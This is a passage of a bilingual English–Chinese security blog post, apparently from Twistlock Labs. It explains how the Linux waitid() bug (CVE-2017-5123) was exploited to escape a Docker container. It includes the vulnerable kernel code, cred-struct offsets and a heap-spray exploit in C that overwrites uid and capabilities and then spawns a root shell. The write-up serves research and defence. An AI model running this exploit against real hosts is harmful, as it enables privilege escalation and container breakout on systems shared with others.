(編按:這個權限在 Linux manual 中建議最好避免使用，畢竟會賦予非常多的權限，幾乎可以說是一個另類的 root，除非須需求幾乎等同於此 cap，否則建議能避則避。)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;You can find the full list of CAPS over here.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;你可以在&lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;這裡&lt;/a&gt;找到完整的 CAPS 清單。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Docker uses capabilites to provide a better isolation for containers. It simply drops capabilities that would enable container escape. For example, you will rarely see a container that is running out-of-the-box with any of the 3 capabilities above, as it would be security concern if a container could access the network interface and sniff the traffic of other containers or the host itself, or if a user inside the container could mount directories on the host and load kenrel modules.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Docker 使用 capabilities 來為容器提供一個較好的隔離環境。Docker 純粹的將可能造成脫離容器的 capabilities 拿掉。例如，你會幾乎看不到一個容器運行在限制之外，有著上述三個 capabilities 的任何一個，當一個容器可以存取網路介面並嗅探其他容器或是主機的流量，或是一個在容器中的使用者可以在主機上掛上目錄並且載入核心模組，這些都是有安全疑慮的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Although it might be easier to build a ROP chain and call commit_creds(0) in order to gain root with full capabilities, in order to learn more about heap spraying, I decided to go with the blind exploitation method by spraying the kernel heap with thousands of struct creds like Federico did. The downside of the this exploit is that full caps are impossible to reach as we are not in control of what we are writing(we are limited to 0x8000) and the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt; is out of reach for us.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;雖然造一個 &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;ROP&lt;/a&gt;鏈來呼叫 commit_creds(0) 以獲得 root 權限與全部的 capabilities 似乎來的更簡單一點，但為了學到更多與堆積噴灑相關的技巧，並且在不知道目標環境下的漏洞利用方法，就像 Federico 做的一樣，將數千個 creds 結構噴好噴滿到核心堆積中。這個漏洞利用的缺點就是無法取得全部的 caps，因為我們無法控制寫入的東西(我們受限於 0x8000 的限制) 而且 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt; 對我們來說是不可能達到的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;the-vulnerability--弱點成因&quot;&gt;The vulnerability / 弱點成因&lt;/h2&gt;

&lt;p&gt;The code snippet below is taken from &lt;em&gt;kernel/exit.c&lt;/em&gt; and is in charnge of handling the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這是從 &lt;em&gt;kernel/exit.c&lt;/em&gt; 取得的程式碼片段，負責處理系統
呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt;:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;SYSCALL_DEFINE5(waitid, int, which , pid_t, upid, struct siginfo __user *, infop, int, options, struct rusage __user *, ru)
{
    struct rusage r;
    struct waitid_info info = {.status = 0};
    
    long err = kernel_waitid(which, upid, &amp;amp;info, options, ru ? &amp;amp;r : NULL);
    
    int signo = 0;
    
    if (err &amp;gt; 0) {
        signo = SIGCHLD;
        err = 0;
        if (ru &amp;amp;&amp;amp; copy_to_user(ru, &amp;amp;r, sizeof(sturct rusage)))
        return -EFAULT;
    }
    if (!infop)
        return err;
    
    if (!/*醒目*/access_ok/*提示*/(VERIFY_WRITE, infop, sizeof(*infop)))
        return -EFAULT; 
    user_access_begin();
    unsafe_put_user(signo, &amp;amp;infop-&amp;gt;si_signo, Efault);
    unsafe_put_user(0, &amp;amp;infop-&amp;gt;si_errno, Efault);
    unsafe_put_user(info.cause, &amp;amp;infop-&amp;gt;si_code, Efault);
    unsafe_put_user(info.pid, &amp;amp;infop-&amp;gt;si_pid, Efault);
    unsafe_put_user(info.uid, &amp;amp;infop-&amp;gt;si_uid, Efault);
    unsafe_put_user(info.status, &amp;amp;infop-si_status, Efault);
    user_access_end();
    return err;
Efault:
    user_access_end();
    return -EFAULT;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The vulnerability is that the highlighted &lt;code class=&quot;highlighter-rouge&quot;&gt;access_ok()&lt;/code&gt; check, which ensures that the user specified pointer is in face a user-space pointer, was missing in the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall. Without this check a user can supply a kernel address pointer and the syscall will write to it without objections when executing &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;弱點在於有醒目提示的 &lt;code class=&quot;highlighter-rouge&quot;&gt;access_ok()&lt;/code&gt; 檢查，用來保證使用者指定的指標是屬於使用者空間的指標，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫中少了這個檢查，缺了這個檢查，使用者可以提供一個核心地址指標，當執行 &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user&lt;/code&gt; 時系統呼叫會毫無異議的寫入該位址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As we already know - we can’t simply write whatever we want, but we will have to try to gain as much as we can within these limitations.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如同我們已經知道的 - 我們不能任意的想寫入哪裡就寫入哪裡，但我們必須在這些限制之下，竭盡我們所能的嘗試獲取可寫位址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Info.status&lt;/code&gt; is a 32bit int, but the value of status is constrained to 0 &amp;lt; status &amp;lt; 256 as we can ses in the exit codes documentation, and as we already know&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;is constrained by&lt;code class=&quot;highlighter-rouge&quot;&gt;MAX_PID&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Info.status&lt;/code&gt;是一個 32bit 整數，但狀態的值被約束在 0 與 256 之間，就像我們在 exit 程式碼文件看到的，同時我們也知道&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;被&lt;code class=&quot;highlighter-rouge&quot;&gt;MAX_PID&lt;/code&gt;約束了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;At this point we have the ability to write a value of pid: 0 &amp;lt; pid &amp;lt; 0x8000 to anywhere we want. The next challenge is to detect where we should write in order to successfully overwirte the desired values.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;目前我們有寫入 pid 值得能力: 介於 0 到 0x8000，到任意我們想要的地方，下一個挑戰是偵測到我們該寫到的位置，才能成功的覆寫想要的值。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We need to rememer that the syscall will actually write 6 different fields each time we execute it, as there will be 6 executions of &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user()&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們需要記得，系統呼叫在每次執行的時候，實際上會寫入 6 個不同欄位，因為有 6 個 &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user()&lt;/code&gt; 被執行了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So we will need to take into account the offset of &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; sturct and use it to subtract that value from the target address into &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall as the &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; pointer.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以我們需要帶入 &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; 結構中 &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; 的帳戶偏移值，並使用它減去到 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 呼叫的目標位址的值作為 &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; 指標。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Our main goal with this exploit is to overwrite the capabilities that Docker sets for us, thus gaining additional privileges and to escape the container.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們使用這個漏洞利用的主要目標是，覆寫 Docker 為我們設定的 capabilities，就可以獲得額外的權限並且逃離容器。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;spray-n-pray--噴灑並禱告&quot;&gt;Spray n’ Pray / 噴灑並禱告&lt;/h2&gt;

&lt;p&gt;I decided to take an approach similar to Federico, so I proceeded to spray the kernel heap with thousands of struct &lt;code class=&quot;highlighter-rouge&quot;&gt;creds&lt;/code&gt; and then start guessing by writing to various addresses and pray to hit my target.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我決定使用與 Federico 相似的方法，所以我用數千個 &lt;code class=&quot;highlighter-rouge&quot;&gt;creds&lt;/code&gt; 結構將核心堆積噴好噴滿，然後開始透過寫入不同位址來猜測，禱告並祈求可以擊中我的目標。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;By picking a value that we can track such as &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; (which we can track with getuid()).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;藉著選一個我們可以追蹤的值如 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; (我們可以使用 getuid() 來追蹤)。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We can, with a little bit a luck, pinpoint our &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; location, after which we will be able to write to specific offsets in order to overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;capabilities&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; and anything else we want.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;幸運的話，我們可以做到的，指向我們的 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; 位置，之後我們將能寫到指定的偏移，就可以覆寫 &lt;code class=&quot;highlighter-rouge&quot;&gt;capabilities&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; 與其他任何我們想要的東西。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;But in order to do that we need to figure out the actual offsets, which we will do with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;但為了要實現，我們需要搞清楚真實的偏移值，我們將依靠 &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; 的幫助來實現:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, &lt;code class=&quot;highlighter-rouge&quot;&gt;kuid_t&lt;/code&gt; is 4 bytes in size, as such if we found uid on &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1004&lt;/code&gt; than &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; will be at &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1008&lt;/code&gt;, 4 bytes above, and &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; will be at &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023CC1014&lt;/code&gt; which is 4*0x4=0x10 bytes above our &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; address as illustrated in the diagram below.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;猶如我們看到的， &lt;code class=&quot;highlighter-rouge&quot;&gt;kuid_t&lt;/code&gt; 是 4 個位元組的大小，因為醬子，如果我們在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1004&lt;/code&gt; 發現 uid ，那麼 &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; 會在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1008&lt;/code&gt;， 4 個位元組之上，而 &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; 會在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023CC1014&lt;/code&gt;，就是 4*0x4=0x10(編按: 0x開頭是16進位，並非0乘4) 位元組之上，我們的 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 位址，如下圖所示。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So essentially in order to overwite our caps will have to write to:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以重要的是為了覆寫我們的 caps 將必須寫到:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;address_of_uid+0x4*8 = address_of_uid+0x20 = address_of_cap_inferitable&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Note: These addresses are relevant to my system, your addresses might differ.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;註: 這些位址跟我的系統有相關聯，你的位址可能會不一樣。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In order to find out where our sprayed &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; might land in the heap we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; again and set a breakpoint on &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_getuid&lt;/code&gt; in order to break when our program calls &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;為了找到我們噴灑的 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; 在堆積中可能的落點，我們將再次使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; 並設置一個中斷點在 &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_getuid&lt;/code&gt; 上，以便在程式呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt; 的時候中斷下來。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A few step commands after the breakpoint (it took 5 on my system) should reveal the &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; address in the RAX register.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;斷下來後，步進幾個指令(在我的系統上是 5 個)應該會在 RAX 暫存器中顯示 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 的位址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We can repeat that process of finding the struct for a number of forks in order to collect enough addresses and analyze the statistics of where the &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; is most likely to be in the heap&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們可以重複這個找結構的過程，藉由數個分叉(fork)以便收集足夠的位址並分析統計 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; 在堆積中最有可能的所在。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So the plan is as follows:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;計畫如下:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;Spawn thousands of processes by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; in order to create thousands of &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; in the kernel heap and make each of the processes constantly check if its UID==0 by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Start writing the value 0 to addresses to which the &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred-&amp;gt;uid&lt;/code&gt; might land&lt;/li&gt;
  &lt;li&gt;If and when one of our forked processes gets uid==0, it means that we have successfully overwritten the &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; value with our guesses from step 2. Now we can overwrite the rest of the &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; and change caps by writing to the offsets that we determined.&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;為了在核心堆積中創造數千個 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; 需要透過呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; 產生數千個行程，並且呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt; 使每個行程都不斷地檢查它自己的 UID 是否為 0&lt;/li&gt;
    &lt;li&gt;開始將 0 寫入位 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred-&amp;gt;uid&lt;/code&gt; 可能的落點位址中&lt;/li&gt;
    &lt;li&gt;當其中一個我們分叉(fork)出來的行程獲得 uid 為 0，就代表我們已經成功從第二步猜測到並覆寫了&lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt;的值。現在我們可以覆寫 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 其餘的部分並藉由覆寫我們計算的值來修改 caps。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;Our dirty exploit will be something to the effect of:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們的髒髒漏洞利用效果如下:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;void writecaps(char *addr,unsigned long value){
while(1) {
      int pid = clone(exit_func, &amp;amp;amp;new_stack[5000], CLONE_VM | SIGCHLD, NULL);
      if (!pid) {
        exit(0);
      }
      if (pid == value) {
        syscall(SYS_waitid, P_PID, pid, addr, WEXITED, NULL);
        break;
      }
}

void spraynpray(){
pid_t pid;
FILE *f;
char *argv[] = {&quot;/bin/sh&quot;, NULL};
for (int i=0;i&amp;lt;5000;i++)
{
    pid = fork();
    if (pid==0)
    { // child process
  while (1) {
    
    if (*glob_var==1) {
      syscall(SYS_exit, 0);
    }
    if (getuid() == 0){
        //FOUND!!
    printf(&quot;[+] Got UID: 0 !\n&quot;);
     *glob_var = 1;
     writecaps((char *)finalcapsaddress,value);
    printf(&quot;Done, spawning a shell \n&quot;);
    execve(&quot;/bin/sh&quot;, argv, NULL);
    }
}
    }

    else if(pid&amp;lt;0)
    {
        printf(&quot;failed to fork&quot;);
    }

    else // parent process
    {

    }
}
}

void swapuid(){

    char* i,p;
    while(*glob_var!=1)
    {
    for(i = (char *)0xffff8800321b4004; ; i+=0xc0)
        {
        if(*glob_var==1)
            {
            break;
            }
        printf(&quot;trying %p\n&quot;,i);
        syscall(__NR_waitid, P_PID, 0,(siginfo_t *)i, WEXITED, NULL);
        sleep(1);
        }
    }
munmap(glob_var, sizeof *glob_var);
printf(&quot;Found uid on %p\n&quot;,i-0xc0);
sleep(10000);
}

int main(void)
{
    glob_var = mmap(NULL, sizeof *glob_var, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    *glob_var = 0;

unsigned long* base = findbase();
    findheapbase();
    spraynpray();
    swapuid();
}
    
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After analyzing my system (Ubuntu 17.10,Kernel 4.13.0-15, arch x86-64), I found a couple of areas where it seemed that cred struct is more likely to land in about 70% of the executions, but there is still a risk of crashing the machine because we may overwrite something important in the kernel.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在分析我的系統資後 (Ubuntu 17.10, 核心 4.13.0-15, 架構 x86-64)，我發現數個區域貌似是運行時 creds 結構有 70% 以上的落點，但那仍然有使機器掛掉的風險存在，因為我們可能會覆寫到核心中重要的東西。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;conclusion--結論&quot;&gt;Conclusion / 結論&lt;/h2&gt;

&lt;p&gt;In 2017 alone, 434 linux kernel exploits where found, and as you have seen in this post, kernel exploits can be devastating for containerized environments. This is because containers share the same kernel as the host, thus trusting the built-in protection mechanisms alone isn’t sufficient. Make sure your kernel is always updated on all of your production hosts.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;光是 2017 年就已經有 &lt;a href=&quot;https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33&quot;&gt;434 個 Linux 核心漏洞利用&lt;/a&gt;被發現，如同你在這篇文章中看到的一樣，核心漏洞利用對容器環境來說是具毀滅性的。這是因為容器與主機分享核心，因此光是信任內建的保護機制並不足夠。確保你的核心在所有的產品主機都總是最新的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Thank you for reading and don’t forget to follow us @TwistlockLabs.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;謝謝你的閱讀，別忘了在 &lt;a href=&quot;https://twitter.com/TwistlockLabs&quot;&gt;@TwistlockLabs&lt;/a&gt; 跟隨我們。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Big credits to Federico Bento for pointing some things out and to &lt;a href=&quot;https://salls.github.io/Linux-Kernel-CVE-2017-5123/&quot;&gt;Chris Salls&lt;/a&gt; for his Chrome sandbox escape exploit; my exploitation is heavily based on their work.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;給點清了某些事情的&lt;a href=&quot;https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/&quot;&gt;Federico Bento&lt;/a&gt;一個大大的讚， &lt;a href=&quot;https://salls.github.io/Linux-Kernel-CVE-2017-5123/&quot;&gt;Chris Salls&lt;/a&gt;也是，感謝他的 Chrome 沙盒逃脫漏洞利用; 我的漏洞利用大多數是基於他們的成果。&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="Docker" /><category term="CVE" /><category term="Linux" /><summary type="html">The post describes how I exploited the waitid() vulnerability in order to modify the Linux capabilities of a Docker container to gain elevated privileges, and ultimately escape the container jail. If you wnat to see how Twistlock would stop this vulnerability in its tracks, check out my follow up blog.</summary></entry></feed>